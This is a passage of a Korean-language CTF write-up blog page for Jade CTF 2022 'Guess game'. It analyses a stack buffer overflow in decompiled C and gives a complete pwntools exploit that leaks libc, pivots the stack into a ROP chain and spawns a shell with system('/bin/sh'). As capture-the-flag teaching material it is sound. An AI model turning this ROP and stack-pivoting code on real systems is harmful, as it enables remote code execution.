@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Info(16&#x2F;630) solves for player123.├── chall└── libc.so.6  AnalysisMitigation12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jade CTF 2022 - Guess game (Stack pivoting)">
+<meta property="og:url" content="https://jiravvit.github.io/221028-jadectf2022-guess_game/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="Info(16&#x2F;630) solves for player123.├── chall└── libc.so.6  AnalysisMitigation12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x4">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-10-27T22:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-22T18:47:30.712Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="Jade CTF">
+<meta property="article:tag" content="Stack pivoting">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>Jade CTF 2022 - Guess game (Stack pivoting)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/221121-poxx2022-shop_revenge/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/221028-jadectf2022-roll_the_dice/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/221028-jadectf2022-guess_game/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&text=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&is_video=false&description=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Jade CTF 2022 - Guess game (Stack pivoting)&body=Check out this article: https://jiravvit.github.io/221028-jadectf2022-guess_game/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&title=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/221028-jadectf2022-guess_game/&name=Jade CTF 2022 - Guess game (Stack pivoting)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/221028-jadectf2022-guess_game/&t=Jade CTF 2022 - Guess game (Stack pivoting)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.1.</span> <span class="toc-text">for player</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">2.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Source Code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-even-option"><span class="toc-number">2.2.1.</span> <span class="toc-text">1. even_option()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-odd-option"><span class="toc-number">2.2.2.</span> <span class="toc-text">2. odd_option()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit Scenario</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PART1"><span class="toc-number">3.1.1.</span> <span class="toc-text">PART1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PART2"><span class="toc-number">3.1.2.</span> <span class="toc-text">PART2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">3.3.</span> <span class="toc-text">Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tmi"><span class="toc-number">4.</span> <span class="toc-text">tmi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1"><span class="toc-number">4.0.1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Jade CTF 2022 - Guess game (Stack pivoting)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-27T22:00:00.000Z" itemprop="datePublished">2022-10-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Jade-CTF/" rel="tag">Jade CTF</a>, <a class="tag-link-link" href="/tags/Stack-pivoting/" rel="tag">Stack pivoting</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(16&#x2F;630) solves</p>
+<h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chall</span><br><span class="line">└── libc.so.6</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  fill_secret_buffer();</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Welcome to my game, choose any number between 1-10\n&quot;</span>, <span class="number">0x33</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter a number: &quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">10</span> || v4 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Wrong number entered\n&quot;</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    odd_option();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    even_option();                              <span class="comment">// not vuln</span></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Bye bye\n&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main 함수에서 수 하나를 입력받는데 0부터 9사이의 범위만 인정한다. 그 다음 &amp; 연산을 진행하는데 입력 값이 홀수라면 <code>odd_option()</code> 함수를 실행하고 아니라면 <code>even_option()</code> 함수를 실행한다. 후자의 함수에 취약점이 없기 때문에 간단하게 먼저 살펴보자.</p>
+<h4 id="1-even-option"><a href="#1-even-option" class="headerlink" title="1. even_option()"></a>1. even_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">even_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">108</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter your name: &quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;Hello %s, we are sorry but you gave us the wrong input. Please try again.\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">2</span>, temp_buffer, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>지역변수 s에 이름을 입력받는다. bof가 일어날 가능성을 염두에 뒀지만 108 크기에 100만큼 입력하기 때문에 bof는 일어나지 않는다. 이 함수에서 취약점은 발생하지 않는다. </p>
+<h4 id="2-odd-option"><a href="#2-odd-option" class="headerlink" title="2. odd_option()"></a>2. odd_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">odd_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">108</span>]; <span class="comment">// [rsp+D0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+13Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Let&#x27;s begin, but first here is how you play:\n&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- A number will be shown to you\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- You have to enter two strings\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The first should be your name\n&quot;</span>, <span class="number">0x22</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The second string should be equal to the secret code\n&quot;</span>, <span class="number">0x39</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- If you successfully guess the secret code, you win!\n&quot;</span>, <span class="number">0x36</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;\nHere&#x27;s the number: %lld\n&quot;</span>, s);</span><br><span class="line">  write(<span class="number">2</span>, temp_buffer, v3);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter first input please: &quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">200</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter second input please: &quot;</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  fgets(dest, <span class="number">130</span>, <span class="built_in">stdin</span>); <span class="comment">// bof</span></span><br><span class="line">  result = <span class="built_in">strcpy</span>(dest, secret_buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Congrats! You win!\n&quot;</span>, <span class="number">0x13</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>208 크기의 지역변수 s에 200만큼 입력하고 108 크기의 지역변수 dest에 130만큼 입력한다. 여기서 bof가 발생한다. 바로 뒤에 srctpy함수에서 secret_buffer를 dest에 복사한다.<br>이 함수가 실행되기 전에 main에서 <code>fill_secret_buffer()</code> 함수를 호출하는데 여기서 secret_buffer 전역변수를 채운다.</p>
+<p>결론적으로 알아낸 것은 지역변수 dest에서 130-0x70 즉, 18만큼 overflow가 난다는 것이다.</p>
+<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>overflow가 18만큼난다? sfp(rbp), ret..</p>
+<p>ret까지 안전하게 덮고 2바이트 더 overflow가 난다. ROP를 하기에는 overflow가 충분히 나지 않는다. 이럴 때 해야하는 것이 Stack pivoting이다. 이와 관련해서는 (구 블로그에도 써놨지만) 시간이 된다면 이 블로그에 글을 새로 쓸 예정이다.</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>overflow가 ret까지 날 때는 stack pivoting 기법을 고려해볼 수 있겠다. 이를 위해서 fake stack을 구성할 공간이 필요하다. 이 문제에서는 “Enter first input please: “에서 지역변수 s에 200만큼 입력할 수 있다. 200바이트면 ROP 페이로드를 적기에 충분하다. 여기를 fake stack으로 한다! 땅땅</p>
+<h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="PART1"><a href="#PART1" class="headerlink" title="PART1"></a>PART1</h4><ol>
+<li>libc leak하는 ROP 페이로드를 작성하여 stack에 구성</li>
+<li>위 stack으로 흐름 변경</li>
+</ol>
+<h4 id="PART2"><a href="#PART2" class="headerlink" title="PART2"></a>PART2</h4><ol>
+<li><code>system(&#39;/bin/sh\x00&#39;)</code>을 호출하는 ROP 페이로드를 작성하여 stack에 구성</li>
+<li>위 stack으로 흐름 변경</li>
+</ol>
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART1</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400946</span></span><br><span class="line">ret = <span class="number">0x04006b9</span></span><br><span class="line"></span><br><span class="line">fake_stack= <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>])</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">stack_pivoting_gadget = <span class="number">0x0400B1C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;libc leak :: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;offset :: &#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]))</span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak 2 :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">fake_stack = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(binsh)</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;p1v0t!_p1v0t!_p1v0t!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>다 풀고 나서 롸업 작성하는데 문제 풀 때는 못 봤던 함수를 발견했다..ㅋㅋ 이 함수를 진작에 봤더라면 더 쉽게 문제를 풀 수 있었을 텐데.. 그런데 이런 생각을 가지면 안된다. 이 문제 덕에 스택 피봇팅 리마인드했으니까~ 오히려 좋다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">hidden_level</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">112</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Oooh! You reached the hidden level, type the mantra to unlock the hidden door:\n&quot;</span>, <span 